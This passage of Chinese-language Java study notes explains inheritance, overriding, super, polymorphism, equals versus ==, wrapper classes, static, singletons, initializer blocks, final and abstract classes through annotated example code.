String name;  //私有的也继承到了，通过getXXX方法来获取\n\tprivate int age;\n\t\n\tpublic Person() {\n\t\t\n\t}\n\n\tpublic Person(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\t\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\t\n\tpublic void eat() {\n\t\tSystem.out.println(\"吃\");\n\t}\n\t\n\tpublic void sleep() {\n\t\tSystem.out.println(\"睡觉\");\n\t}\n}\n\n```\n\n子类：\n\n```java\npublic class Student extends Person{    // extends Person ：表示继承Person类\n\tprivate String major;\n\t\n\t//构造方法\n\tpublic Student() {\n\t\tsuper();\n\t}\n\t\n\tpublic Student(String major) { \n\t\tsuper();\n\t\tthis.major = major;\n\t}\n\t// get\n\tpublic String getMajor() {\n\t\treturn major;\n\t}\n\t// set\n\tpublic void setMajor(String major) {\n\t\tthis.major = major;\n\t}\n\n\tpublic void study() {\n\t\tSystem.out.println(\"学习\");\n\t}\n\t\n\tpublic void show() {\n\t\tSystem.out.println(\"姓名：\" + getName() + \", 年龄：\" + getAge() + \"，专业：\" + getMajor());\n\t}\n    \t//重写父类方法\n    @Override\n\tpublic void eat() {\n\t\tSystem.out.println(\"学生应该多吃\");\n\t}\n}\n\n```\n\n\n\n#### 方法的重写(override 、 overwrite)\n\n> 与前面的\"重载\"区分\n\n**定义：**在子类中可以根据需要对从父类中继承来的方法进行改造，也称为方法的<font color=red>重置、覆盖</font>。在程序执行时，子类的方法将覆盖父类的方法（子类根据需要对从父类继承来的方法进行改造）。\n\n**要求：**\n\n1. 子类重写的方法必须和父类被重写的方法具有<font color=red>相同的方法名称、参数列表</font>\n2. 子类重写的方法的返回值类型<font color=red>不能大于</font>父类被重写的方法的返回值类型\n3. 子类重写的方法使用的访问权限<font color=red>不能小于</font>父类被重写的方法的访问权限\n   - 子类不能重写父类中声明为private权限的方法\n4. 子类方法抛出的异常不能大于父类被重写方法的异常\n\n\n\n**注意：**\n\n子类与父类中同名同参数的方法必须同时声明为<font color=red>非static的</font>(即为重写)\n\n若同时声明为static的〈不叫重写），因为static方法是属于类的，子类无法覆盖父类的方法。\n\n```java\n * 【重写】override 、 overwrite\n * 子类根据需要对从父类继承来的方法进行改造\n * \n * 形式：权限修饰符   (可选：static/final) 返回值类型   方法名(形参列表)  throws 异常的类型{\n * \t//方法体\n * }\n * \n * 1.必须与父类被重写的方法具有“相同的方法名称、参数列表”\n * 2.子类重写的方法的返回值类型“不能大于”父类被重写的方法的返回值\n * \t\t\t>父类被重写的方法的返回值类型是void，则子类重写的方法的返回值类型只能是void\n *\t\t\t>父类被重写的方法的返回值类型是A类型，则子类重写的方法的返回值类型可以是A类或A类的子类\n *\t\t\t>父类被重写的方法的返回值类型是基:本据类型，则子类重写的方法的返回值类型必须是相同的基本数据类型\n * 3.子类重写的方法使用的当问权限“不能小于”父类被重写的方法的访问权限\n * \t\t\t>子类不能重写父类中private的方法\n * 4.子类方法抛出的异常不能大于父类被重写方法的异常\n * \t\t\t>\n * \n * 子类与父类中同名同参数的方法必须同时声明为非static的(即为重写)，或者同时声明为static的（不是重写）。因为static方法是属于类的，子类无法覆盖父类的方法。\n * \n```\n\n\n\n#### super关键字\n\n- 子类重写了父类的方法之后，可以用super调用父类中的方法\n- super可以调用：属性、方法、构造器\n\n\n\n**super调用属性和方法：**\n\n* 我们可以在子类的方法或构造器中。通过使用`super.属性`或`super.方法`的方式，显式的调用父类中声明的属性或方法。但是，通常情况下，我们习惯省略`super. `\n * 特殊情况: 当子类和父类中定义了同名的属性时，我们要想在子类中调用父类中声明的属性，则必须显式的使用`super.属性`的方式，表明调用的是父类中声明的属性。\n * 特殊情况: 当子类重写了父类中的方法以后，我们想在子类的方法中调用父类中被重写的方法时，则必须显式的使用`super.方法`的方式，表明调用的是父类中被重写的方法。\n\n **super调用父类构造器：**\n\n * 我们可以在子类的构造器中显式的使用`super(形参列表)`的方式，调用父类中声明的指定的构造器\n * `super(形参列表)`的使用，必须声明在<font color=red>子类构造器的首行!</font>\n * 我们在类的构造器中，针对于`this(形参列表)`或`super(形参列表)`<font color=red>只能二选一</font>，不能同时出现\n * 在构造器的首行，没有显式的声明`this(形参列表)`或`super(形参列表)`，则<font color=red>默认调用的是父类中空参的构造方法</font>\n * 在类的多个构造器中，至少有一个类的构造器中使用了`super(形参列表)`，调用父类中的构造器\n\n**子类对象实例化的全过程：**\n\n```java\n1．从结果上来看:(继承性)\n     * 子类继承父类以后，就获取了父类中声明的属性或方法。\n     * 创建子类的对象，在堆空间中，就会加载所有父类中声明的属性。\n         \n2．从过程上来看;\n     * 当我们通过子类的构造器创建子类对象时，我们一定会直接或间接的调用其父类的构造器，进而调用父类的父类的构造器,直到调用了java.lang.0bject类中空参的构造器为止。正因为加载过所有的父类的结构，所以才可以看到内存中有父类中的结构，子类对象才可以考虑进行调用。\n     \n* 明确:虽然创建子类对象时，调用了父类的构造器，但是自始至终就创建过一个对象，即为new的子类对象。\n```\n\n如子类：\n\n```java\npublic class Student extends Person{    // extends Person 继承Person类\n\tprivate String major;\n\tprivate int id = 1002;  //学号\n\t\n\t//构造方法\n\tpublic Student() {\n\t\tsuper();\n\t}\n\t\n\tpublic Student(String name, int age, String major) {\n\t\tsuper(name, age);  // super调用父类构造器\n\t\tthis.major = major;\n\t}\n\n\n\tpublic int getId() {\n\t\treturn id;\n\t}\n\n\tpublic void setId(int id) {\n\t\tthis.id = id;\n\t}\n\n\tpublic Student(String major) { \n\t\tsuper();\n\t\tthis.major = major;\n\t}\n\t// get\n\tpublic String getMajor() {\n\t\treturn major;\n\t}\n\t// set\n\tpublic void setMajor(String major) {\n\t\tthis.major = major;\n\t}\n\n\tpublic void study() {\n\t\tSystem.out.println(\"学习\");\n\t}\n\t\n\t//重写父类方法\n\t@Override\n\tpublic void eat() {\n\t\tSystem.out.println(\"学生应该多吃有营养的食物...\");\n\t\tsuper.sleep();\n\t}\n\t\n\tpublic void show() {\n\t\tSystem.out.println(\"姓名：\" + getName() + \", 年龄：\" + getAge() + \"，专业：\" + getMajor());\n\t\tSystem.out.println(this.getId());  // 子类id\n\t\tSystem.out.println(super.getId());\t\t// 父类id\n\t}\n\t\n\t\n}\n\n```\n\n测试类：\n\n```java\npublic class ExtendsTest {\n\tpublic static void main(String[] args) {\n\t\tPerson p1 = new Person(\"张三\", 18);\n\t\tp1.eat();\n\t\t\n\t\tStudent s1 = new Student(\"GIS\");\n\t\ts1.setName(\"张三三\");\n\t\ts1.setAge(22);\n\t\t// 父类中的方法，子类中也可以调用 来实现复用\n\t\ts1.show();\n\t\ts1.eat();\n\t\t\n\t\tStudent s2 = new Student(\"小李\", 18, \"CS\");  //super调用父类构造器, 可以直接在这初始化\n\t\ts2.show();\n\t\t\n\t}\n}\n```\n\n\n\n\n\n\n\n### <font color=red>多态性(Polymorphism)</font>\n\n**对象的多态性：**父类的引用指向子类的对象（可以直接应用在抽象类和接口上）\n\n\n\nJava引用变量有两个类型：\n\n- 编译时类型：由声明该变量时候使用的类型决定\n- 运行时类型：由实际赋给该变量的对象决定\n\n**简称：编译看左，运行看右**\n\n#### 虚拟方法\n\n![](http://image.xpshuai.cn/java%E8%99%9A%E6%8B%9F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8.png)\n\n\n\n**问：多态是编译时行为还是运行时行为？**\n\n**答：运行时行为**\n\n\n\n\n\n#### instanceof操作符\n\n`x instanceof A`：检验x是否为类A的对象，返回值为boolean类型\n\n- 要求x所属的类与类A必须是子类和父类的关系，否则编译错误\n- 如果x属于类A的子类B(间接父类子类关系)，也可以使用\n\n\n\ninstanceof情景：为了避免在向下转型时出现ClassCastException的异常，我们在向下转型之前，先进行instanceof判断\n\n\n\n#### toString()\n\n输出样式，可以手动重写子类中的该方法\n\n\n\n### finalize()\n\n对象回收之前会调用这个方法：finalize()， 子类可重写\n\n```java\n//子类中\nclass B{\n    @Override\n    protecred void finalize() throws Throwable{\n        System.out.println(\"对象被释放--> \"  = this);\n    }\n\n\t...\n}\n\n//强制性释放空间\nSystem.gc();\n    \n    \n```\n\n\n\n\n\n### == 与 equals()\n\n![](http://image.xpshuai.cn/qeuals%E5%92%8C%3D%3D%E5%8C%BA%E5%88%AB.png)\n\n\n\n```java\n\nimport java.sql.Date;\n\n/*\n * \n * == 与equals()\n * \n * \n * 面试题： == 与equals() 区别？\n * 【== 运算符】\n 1.可以使用在基本数据类型变量和引用数据类型变量中\n 2.如果比较的是基本数据类型变量:比较两个变量保存的数据是否相等(不一定类型要相同)\n        如果比较的是引用数据类型变量，比较两个对象的地址值是否相同.即两个引用是否指向同一个对象实体\n\n【equals()方法】\n是一个方法，而非运算符\n只能用于引用数据类型\n像String、 Date、File、包装类等都重写了0bject类中的equals()方法。重写以后，比较的不是两个引用的地址是否相同，而是比较两个对象的T体内容是否相同。\n\n\n\n【重写Object类中的equals()】\n通常情况下，我们自定义的类如果使用equals()的话，也通常是比较两个对象的\"实体内容\"是否相同。那么，我们就需要对Object类中的equals()进行重写\n重写的原则：比较两个对象的实体内容是否相同.\n\n * \n */\npublic class EqualsTest {\n\tpublic static void main(String[] args) {\n\t\tint i = 10;\n\t\tchar c = 10;\n\t\tSystem.out.println( c == i);  // true\n\t\t\n\t\tchar c1 = 'A'; // ascii码也为65\n\t\tchar c2 = 65;   \n\t\tSystem.out.println(c1 == c2); //true\n\t\t\n\t\t\n\t\tCustomer customer1 = new Customer(\"xxx\");\n\t\tCustomer customer2 = new Customer(\"xxx\");\n\t\t\n\t\tSystem.out.println(customer1 == customer2);   // false\n\t\t\n\t\t\n\t\t// String也是引用型数据\n\t\tString s1 = new String(\"asd\");\n\t\tString s2 = new String(\"asd\");\n\t\tSystem.out.println(s1 == s2);   // false\n\t\tSystem.out.println(s1.equals(s2));   // true   调用的是String中的equals()，和==作用是相同的\n\t\tSystem.out.println(customer1.equals(customer2));   // false  调用的是Object中的equals, 自定义之后变为true了\n\t\t\n\t\t\n\t\tDate date1 = new Date(2354534654L);\n\t\tDate date2 = new Date(2354534654L);\n\t\tSystem.out.println(date1.equals(date2));  //true\n\n\t}\n}\n\nclass Customer{\n\tString name;\n\tint age;\n\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\n\tpublic Customer() {\n\t}\n\t\n\tpublic Customer(String name) {\n\t\tthis.name = name;\n\t}\n\t\n\tpublic Customer(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\n\t//自己手动重写Object类中的equals()\n\t// 重写原则：\n//\t@Override\n//    public boolean equals(Object obj) {\n//\t\tSystem.out.println(\"Customer的equals()...\");\n//\t\tif(this == obj) {\n//\t\t\treturn true;\n//\t\t}\n//\t\tif(obj instanceof Customer) {\n//\t\t\tCustomer cust = (Customer)obj; //强转\n//\t\t\t//比较两个对象的每个属性是否都相同\n//\t\t\treturn this.age == cust.age && this.name.equals(cust.name);\n//\t\t}else {\n//\t\t\treturn false;\n//\t\t}\n//    }\n\t\n\t//自动重写的\n\t@Override\n\tpublic boolean equals(Object obj) {\n\t\tif (this == obj)\n\t\t\treturn true;\n\t\tif (obj == null)\n\t\t\treturn false;\n\t\tif (getClass() != obj.getClass())\n\t\t\treturn false;\n\t\tCustomer other = (Customer) obj;\n\t\tif (age != other.age)\n\t\t\treturn false;\n\t\tif (name == null) {\n\t\t\tif (other.name != null)\n\t\t\t\treturn false;\n\t\t} else if (!name.equals(other.name))\n\t\t\treturn false;\n\t\treturn true;\n\t}\n\n}\n\n```\n\n\n\n重写equals()方法的原则：\n\n![](http://image.xpshuai.cn/%E9%87%8D%E5%86%99qauals%28%29.png)\n\n\n\n\n\n\n\n### 包装类\n\n#### 单元测试\n\n步骤如下：\n\n```java\npackage cn.xpshuai.java3;\n\nimport org.junit.Test;\n\n/*\n * Java中JUnit单元测试\n * \n * 步骤：\n * 1.选中当前工程–右键选择: build path - add libraries - JUnit 4 -下一步\n * 2.创建Java类，进行单元测试\n * \t\t测试的Java类要求：\n * \t\t\t\t1.此类是public的\n * \t\t\t\t2.此类提供公共是无参数的构造器\n * 3.此类中声明单元测试方法：\n * \t\t此时的单元测试方法：方法权限为public，没有返回值类型。没有形参\n * 4.此单元测试方法需要声明注解：@Test, 并import org.junit.Test;\n *\n * 5.声明好单元测试方法后，就可以在方法中写相关测试代码\n * 6.写完代码后，双击方法名：右键-->Run As --> JUnit Test\n *\n * 说明：\n * 1.如果执行结果没有任何异常:绿条\n * 2.... 异常：红条\n *\n *\n */\npublic class JUnitTest {\n\tint num = 10;\n\t\n\t@Test\n\tpublic void testEquals() {\n\t\tString s1 = new String(\"y\");\n\t\tString s2 = new String(\"yyy\");\n\t\tSystem.out.println(s1 == s2);\n\t\tSystem.out.println(s1.equals(s2));\n\t\t\n\t\tSystem.out.println(num); // 可以直接调用属性和方法\n\t}\n\t\n\t@Test\n\tpublic void testToString() {\n\t\tSystem.out.println(num); \n\t}\n}\n\n```\n\n\n\n\n\n#### 包装类(Wrapper)的使用\n\n> 让基本数据类型也具有类的特征，封装起来\n\n![](http://image.xpshuai.cn/java%E5%8C%85%E8%A3%85%E7%B1%BB.png)\n\n\n\n**基本类型、包装类、String三种类型相互转换：**\n\n![](http://image.xpshuai.cn/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%8C%85%E8%A3%85%E7%B1%BB%E4%B8%8EString%E8%BD%AC%E6%8D%A2.png)\n\n```java\npackage cn.xpshuai.java3;\n/*\n * \n * \n * \n */\nimport org.junit.Test;\n\npublic class WrapperTest {\n\tpublic static void main(String[] args) {\n\t\t\n\t\t\n\t}\n\t\n\t\n\t// 1.基本数据类型转换为包装类：调用包装类的构造器\n\t@Test\n\tpublic void test1() {\n\t\tint num1 = 10;\n\t\t\n\t\tInteger in1 = new Integer(num1);\n\t\tSystem.out.println(in1.toString());\n\t\t\n\t\tInteger in2 = new Integer(\"132\");\n\t\tSystem.out.println(in2.toString());\n\t\t\n\t\t\n\t\tFloat float1 = new Float(\"11.1\");\n\t\tSystem.out.println(float1);\n\t\t\n\t\t\n\t\tBoolean boolean1 = new Boolean(\"tRuE\");\n\t\tBoolean boolean2 = new Boolean(\"true123\");\n\t\tSystem.out.println(boolean1);  // true\n\t\tSystem.out.println(boolean2);  // false  比较特别\n\t\tSystem.out.println(boolean2);  // false  比较特别\n\t\t\n\t\tOrder order = new Order();\n\t\tSystem.out.println(order.isMan);  // null  \n\t\tSystem.out.println(order.isFemale);  // false  \n\t}\n\t\n\t\n\t\n\t// 2.包装类转换为基本数据类型：调用包装类的xxxValue()\n\t@Test\n\tpublic void test2() {\n\t\tInteger in1 = new Integer(12); // 对象\n\t\tint i1 = in1.intValue();  // 变成基本变量了\n\t\tSystem.out.println(i1 + 11);\n\t}\n\t\n\t\n\t// JDK5.0新特性：自动装箱与拆箱，用不着（.基本数据类型转换为包装类：调用包装类的构造器）\n\t@Test\n\tpublic void test3() {\n\t\tint num1 = 10;\n\t\t// 基本数据类型-->包装类的对象\n//\t\tmethod1(num1);\n\t\t\n\t\t// 新特性：自动装箱\n\t\tint num2 = 11; //自动装箱\n\t\tInteger in2 = num2;\n\t\t\n\t\tboolean isFlag = true;  //自动装箱\n\t\tBoolean isFlag2 = isFlag;\n\t\t\n\t\t\n\t\t// 新特性：自动拆箱（包装类转换为基本数据类型）\n\t\tint num3 = in2; // 自动拆箱\n\t\t\n\t}\n\tpublic void method1(Object obj) {\n\t\tSystem.out.println(obj);\n\t}\n\t\n\t\n\t// 3.基本数据类型、包装类 -->转换为String类型\n\t@Test\n\tpublic void test4() {\n\t\t// 方式1：连接运算\n\t\tint num1 = 10;\n\t\tString str1= num1 + \"\";\n\t\t//方式2：调用String重载的valueof(xxx xxx)\n\t\tfloat f2 = 12.3f;\n\t\tString string = String.valueOf(f2);\n\t\tSystem.out.println(string);  // \"12.3\"\n\t\t\n\t\tDouble d1 = new Double(12.5);\n\t\tString string2 = String.valueOf(d1);\n\t\tSystem.out.println(string2);\n\t}\n\t\n\t\n\t// 3.String类型 -->转换为基本数据类型、包装类：调用包装类的parseXXX方法\n\t\t@Test\n\t\tpublic void test5() {\n\t\t\tString str1 = \"123\";\n\t\t\t//记住\n\t\t\tint num2 = Integer.parseInt(str1);\n\t\t\tSystem.out.println(num2); //123\n\t\t\t\n\t\t}\n\t\n\t\n}\n\nclass Order{\n\tBoolean isMan;\n\tboolean isFemale;\n}\n\n\n```\n\n\n\n\n\nVector()可以代替数组，后续再说...\n\n\n\n\n\n### 关键字：static\n\n无论产生了多少个对象，只希望某些特定的数据在内存空间中只有一份\n\nstatic可以用来修饰：属性、方法、代码块、内部类\n\n**static修饰属性：**静态变量\n\n```java\n属性按照是够使用static修饰分为：静态属性 vs 非静态属性(实例变量)\n    \n实例变量：创建的多个对象，每个对象都独立拥有一套类中的非静态属性。当修改其中一个非静态属性时不会影响另一个对象中相同属性值的修改\n    \n静态属性：创建了类的多个对象，公用同一个静态变量，当通过某一个对象修改该静态变量时，会导致其他对象调用该静态变量时是修改过的\n * \n * \t\t(1)静态变量随着类的加载而加载: \"类.静态变量\"方式进行调用\n * \t\t(2)静态变量的加载要早于对象的创建\n * \t\t(3)由于类只会记载一次，则静态变量在内存中也会只存在一份：存在方法区的静态域\n * \t\t\n举例：System.out     Math.PI  \n```\n\n**static修饰方法：**\n\n```java\n静态方法随着类的加载而加载: \"类.静态方法\"方式进行调用\n\t静态方法中，只能调用静态的方法或属性\n    非静态方法中，既可以调用非静态的方法或属性，也可以调用静态的方法或属性\n\t\t\n在静态的方法内，不能使用this关键字、super关键字\n关于静态属性和静态方法的使用，大家都从生命周期的角度去理解。\n```\n\n\n\n\n\n```java\n/*\n * 在开发中，如何确定一个属性是否需要声明为static：\n * \t >属性是可以被多个对象所共享的，不会随着对象的不同而本同的。\n \n *  在开发中，如何确定一个方法是否需要声明为static：\n * \t>操作静态属性的方法，通常设置为static的\n * \t>工具类中的方法，习惯上声明为static的,比如 Math, Collection, Arrats\n */\npublic class StaticClass {\n\tpublic static void main(String[] args) {\n\t\tChinese.nation = \"CHN\";\n\t\t\n\t\tChinese c1 = new Chinese();\n\t\tc1.name = \"姚明\";\n\t\tc1.age = 40;\n//\t\tc1.nation = \"CHN\";\n\t\t\n\t\tChinese c2 = new Chinese();\n\t\tc2.name = \"马龙\";\n\t\tc2.age = 30;\n\t\t\n\t\tSystem.out.println(c2.nation);\n\t\t// 直接 \"类.方法\"  调用\n\t\tChinese.show();\n\t}\n}\n\n\n\nclass Chinese{\n\tString name;\n\tint age;\n\tstatic String nation;\n\t\n\tpublic static void show() {\n\t\tSystem.out.println(\"我是一个中国人！！！\");\n\t\tChinese.nation =\"CHN\";\n//\t\tName = \"YYY\";\n\t\t\n\t}\n\tpublic void show2() {\n\t\tSystem.out.println(\"我是一个中国人2！！！\");\n\t\tChinese.nation =\"CHN\";\n\t\tSystem.out.println(this.name);\n\t\t\n\t}\n}\n\n```\n\n\n\n### 类变量和实例变量内存解析\n\n![](http://image.xpshuai.cn/%E7%B1%BB%E5%8F%98%E9%87%8F%E5%92%8C%E5%AE%9E%E4%BE%8B%E5%8F%98%E9%87%8F%E5%86%85%E5%AD%98%E8%A7%A3%E6%9E%901.png)\n\n\n\n### 单例模式\n\n```java\npackage cn.xpshuai.java4;\n/*\n * 单例(SingleTon)设计模式：\n * 1.定义：某个类只能存在一个实例\n * 2.如何实现\n * \t\t饿汉式单例模式  vs 懒汉式单例模式\n * \n * 3.区分饿汉式、懒汉式\n * 饿汉式： 坏处：对象加载时间过长。\n * \t\t好处：是线程安全的\n *  懒汉式：好处：延迟对象创建\n *  \t目前下面的写法坏处：线程不安全 -->多线程章节再修改\n * \n * 4.单例模式优点：减少了系统的开销\n * \n * 5.单例模式使用场景：\n * \n */\npublic class SingleTonTest {\n\tpublic static void main(String[] args) {\n\t\t// 饿汉式测试\n\t\t// bank1和bank2是一个对象\n\t\tBank bank1 = Bank.getIntance();\n\t\tBank bank2 = Bank.getIntance();\n\t\tSystem.out.println(bank1 == bank2);\n\t\t\n\t\t\n\t\t// 懒汉式测试\n\t\tOrder order1 = Order.getInstance();\n\t\tOrder order2 = Order.getInstance();\n\t\tSystem.out.println(order1 == order2);\n\t}\n}\n\n// 【饿汉式单例模式】\nclass Bank{\n\t// 1.私有化类的构造器：为了避免在外面类调用该构造器\n\tprivate Bank() {\n\n\t}\n\t\n\t// 2.内部创建类的对象\n\t// 4.要求此对象也必须是static的\n\tprivate static Bank instance1 = new Bank();  //先创建\n\t\n\t//3.提供公共静态方法，返回类的对象(类似getXXX方法)\n\tpublic static Bank getIntance() {\n\t\treturn instance1;\n\t}\n}\n\n\n//【懒汉式单例模式】\nclass Order{\n//\t1.私有化类的构造器\n\tprivate Order(){\n\t}\n\t\n//\t2.声明当前类对象（没有初始化）\n//\t4.此对象也必须声明为static\n\tprivate static Order instance2 = null;\n\t\n//\t3.声明public、static的返回当前类对象的方法\n\tpublic static Order getInstance() {\n\t\tif(instance2 == null) {\n\t\t\tinstance2 = new Order();\n\t\t}\n\t\treturn instance2;\n\t}\n}\n\n```\n\n\n\n> 一个.java源文件只能有一个public的类\n\n\n\n\n\n### 代码块\n\n```java\npackage cn.xpshuai.java4;\n/*\n * 类成员4：代码块（或初始化块）\n * \n * 1.代码块作用：用来初始化类、对象\n * 2.如果有修饰的话，只能用static来修饰\n * 3.分类：静态代码块 vs 非静态代码块\n \n * 静态代码块：\n * \t>内部可以有输出语句\n *  >随着类的加载而执行，且只执行一次\n *  >作用：初始化类的信息\n *  >如果一个类中定义多个静态代码块，按照声明优先顺序执行\n *  >静态代码块要优先于非静态代码块的执行\n * \t>只能调用静态结构，不能调用非静态属性和方法\n * \n \n * 非静态代码块：\n * >内部可以有输出语句\n * >随着对象的创建而执行，每创建一个对象就执行一次非静态代码块\n * >作用：可以在创建对象时对对象的属性进行初始化\n * >如果一个类中定义多个非静态代码块，按照声明优先顺序执行\n * >可以调用非静态属性和方法以及静态属性和方法\n  *       非静态代码块执行顺序先于构造器\n * \n * \n * 对属性可以赋值的位置：按顺序排\n * 1.默认初始化\n * 2.显式初始化 / 3.在代码块中赋值\n * 4.构造器初始化\n * 5.有对象之后，通过\"对象.属性\" 或 \"对象.方法\"方式进行赋值\n * \n * \n * \n * 开发中使用代码块(使用频率不高)：\n * \n * \n * 由父及子，先静后构\n * \n * \n */\npublic class BlockTest {\n\tpublic static void main(String[] args) {\n\t\tString desc = Person.desc;\n\t\tPerson p1 = new Person();\n\t\tSystem.out.println(desc);\n\t}\n}\n\n\nclass Person{\n\t//属性\n\tString name;\n\tint age;\n\tstatic String desc = \"我是一个人\";\n\t\n\t//构造器\n\tpublic Person() {\n\t}\n\tpublic Person(String name, int age) {\n\t\tsuper();\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\t//非静态代码块代码块\n\t{\n\t\tSystem.out.println(\"hello非静态代码块1\");\n\t\t// 调用非静态结构\n\t\tage = 1; //\n\t\teat();\n\t\t// 调用静态结构\n\t\tinfo();\n\t\tdesc = \"hhhhhh\";\n\t\t\n\t\t\n\t}\n\t{\n\t\tSystem.out.println(\"hello非静态代码块2\");\n\t\tage = 1; //\n\t\t\n\t}\n\t//静态代码块\n\tstatic{\n\t\tSystem.out.println(\"hello静态代码块1\");\n\t\t// 只能调用静态结构\n\t\tinfo();\n\t\tdesc = \"重新赋值，我是一个爱学习的人1\";\n\t}\n\tstatic{\n\t\tSystem.out.println(\"hello静态代码块1\");\n\t\tdesc = \"重新赋值，我是一个爱学习的人2\";\n\t}\n\t\n\t\t\n\t//方法\n\tpublic void eat() {\n\t\tSystem.out.println(\"人吃饭\");\n\t}\n\t\n\t@Override\n\tpublic String toString() {\n\t\treturn \"Person [name=\" + name + \", age=\" + age + \"]\";\n\t}\n\t\n\tpublic static void info() {\n\t\tSystem.out.println(\"我是一个快乐的人\");\n\t}\n}\n```\n\n\n\n\n\n### final 关键字\n\nfinal可以修饰的结构：类、方法、变量\n\n```java\npackage cn.xpshuai.java4;\n/*\n *关键字：final\n *\n * final可以修饰的结构：类、方法、变量\n * \n * 【final修饰类：】\n * \t该类加了final后，不能被继承了\n * \t\t比如：String,  System, StringBuffer\n * \n * 【 final修饰方法：】\n * \t该方法不能被重写了\n * \t\t比如：Object中的getClass()\n * \n * 【 final修饰变量：】\n * 此时的\"变量\"就称为是一个常量，不能再修改了\n * \t\tfinal修饰属性：可以考虑赋值的位置有：显式初始化、代码块中初始化、构造器中初始化\n * \n * \t 【 final修饰局部变量：】\n * \t\t方法内声明的局部变量、形参\n * \t\t尤其是final修饰形参时候，表示该形参为一个常量，当我们调用时候为这个形参赋值为一个实参，以后，方法内只能进行调用不能修改\n * \n * \n * static final: 用来修饰 属性 -->全局常量(接口中常用)、方法 -->\n * \n * \n*/\npublic class FinalTest {\n\tpublic static void main(String[] args) {\n\t\tAA aa = new AA();\n\t\taa.setDown(10);\n\t}\n}\n\n\nfinal class FinalA{\n\t// 该类不能再被继承了\n}\n\nclass AA{\n\t// 该属性不能再被修改了\n\tfinal String NAME = \"aaa\";\n\tfinal int WIDTH;\n\tfinal int HEIGHT;\n//\tfinal int DOWN;\n\t{\n\t\tWIDTH =10; \n\t}\n\tpublic AA(){\n\t\tHEIGHT = 10; \n\t}\n\tpublic AA(int n){\n\t\tHEIGHT = n; \n\t}\n\t\n\tpublic final void show() {\n\t\t//此方法不能被重写了\n\t}\n\t\n\tpublic void setDown() {\n\t\tfinal int NUM = 11; // final之后就变成常量了\n\t}\n\tpublic void setDown(final int num) {\n\t\tSystem.out.println(num); //修饰形参时候，方法内只能进行调用不能修改\n\t}\n}\n\n```\n\n\n\n### 抽象类与抽象方法（重要）\n\n> abstract\n\n有时将一个父类设计得非常抽象，以至于它没有具体的实例，这样的类叫做抽象类。\n\n```java\npackage cn.xpshuai.java5;\n/*\n * abstract \n * 可以修饰的结构：类、方法\n * abstract修饰，表示不能造对象了\n * \n * abstract修饰类:抽象类\n * \t\t>此类不能实例化\n * \t\t>抽象类中一定有构造器，便于子类实例化时候调用\n * \t\t>开发中，都会提供抽象类的子类，让子类对象实例化并完成操作\n * \n * \n * \n * abstract修饰方法:抽象方法\n * \t\t>只有方法的声明，没有方法体\n * \t\t>如果类中包含有抽象方法，那么该类一定是抽象类。反之抽象类中不一定要有抽象方法\n * \t\t>若子类重写了父类中所有抽象方法中，才能实例化对象\n * \t\t  若子类没有重写父类中的所有的抽象方法，则此子类也是一个抽象类，需要使用abstract修饰\n * \n * \n * 抽样的应用场景举例：\n * \n * \n * 注意点：\n * 1.abstract不能用来修饰：属性、构造器等\n * 2.abstract不能用来修饰私有方法、静态方法、final的方法、final的类\n * \n * \n */\npublic class AbstractTest {\n\tpublic static void main(String[] args) {\n//\t\tPerson p1 = new Person();   // abstract之后就不能实例化对象了\n//\t\tp1.eat();\n\t}\n}\n\n\nabstract class Person { // abstract之后就不能实例化了\n\tprivate String name;  \n\tprivate int age;\n\t\n\tpublic Person() {\n\t}\n\tpublic Person(String name, int age) {\n\t\tthis.name = name;\n\t\tthis.age = age;\n\t}\n\t\n\tpublic String getName() {\n\t\treturn name;\n\t}\n\tpublic void setName(String name) {\n\t\tthis.name = name;\n\t}\n\tpublic int getAge() {\n\t\treturn age;\n\t}\n\tpublic void setAge(int age) {\n\t\tthis.age = age;\n\t}\n\t\n\t\n\tpublic void eat() {\n\t\tSystem.out.println(\"人：吃饭\");\n\t}\n\t\n\tpublic void walk() {\n\t\tSystem.out.println(\"人：走路\");\n\t}\n\t\n\tabstract public void play(); //抽象方法（只有方法的声明，没有方法体）子类中必须得实现这个方法\n\t\n}\n\nclass Student extends Person{\n\tpublic Student(String name, int age) {\n\t\tsuper(name, age);  // \n\t}\n\t\n\t//F1.重写该方法\n\t@Override\n\t public void play() {\n\t\t System.out.println(\"学生玩\");\n\t }\n\t //F2:把子类变成抽象类\n}\n\n\n\n\n```\n\n\n\n**创建抽象类的匿名子类对象**\n\n```java\npackage cn.xpshuai.java5;\n/*\n *  抽象类的匿名子类\n */\npublic class PersonTest {\n\tpublic static void main(String[] args) {\n\t\tmethod(new Student(\"tom\", 19));  //匿名对象\n\t\t\n\t\tWorker worker = new Worker();\n\t\tmethod1(worker);  //非匿名的类和对象\n\t\t\n\t\tmethod1(new Worker());  //非匿名的类, 匿名的对象\n\t\t\n\t\t//创建了一个匿名子类的对象：p\n\t\tPerson p = new Person() {  \n\t\t\t@Override    //重写匿名方法即可\n\t\t\tpublic void play() {\n\t\t\t\tSystem.out.println(\"匿名重写\");\n\t\t\t}\n\t\t\t\n\t\t};\n\t\tmethod1(p); \n\t\t\n\t\t\n\t\t//创建匿名子类的匿名对象（适合用一次的情况）\n\t\tmethod1(new Person() {\n\t\t\t@Override\n\t\t\tpublic void play() {\n\t\t\t\tSystem.out.println(\"玩好玩的东西\");\n\t\t\t}\n\t\t});\n\t\n\t}\n\t\n\tpublic static void method(Student s) {\n\n\t}\n\tpublic static void method1(Person p) {\n\n\t}\n}\n\nclass Worker extends Person{\n\t\n\t@Override\n\tpublic void play() {\n\t\tSystem.out.println(\"工人娱乐\");\n\t}\n}\n\n```\n\n\n\n**多态的应用：**模板方法设计模式\n\n\n\n### 接口(Interface)（重要）\n\n\n\n```java\npackage cn.xpshuai.java5;\n/*\n * 接口关键字的使用：\n * 